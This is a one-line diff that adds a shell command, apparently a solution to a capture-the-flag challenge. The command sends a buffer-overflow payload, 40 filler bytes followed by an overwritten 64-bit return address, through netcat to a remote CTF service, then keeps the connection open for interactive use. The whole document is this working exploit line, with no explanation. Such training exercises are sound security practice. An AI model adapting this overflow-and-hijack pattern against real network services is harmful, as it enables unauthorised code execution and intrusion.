@@ -1,0 +1,1 @@
+(perl -e 'print "a"x40, "\x86\x06\x40\x00\x00\x00\x00\x00\n"';cat) | nc csie.ctf.tw 10125
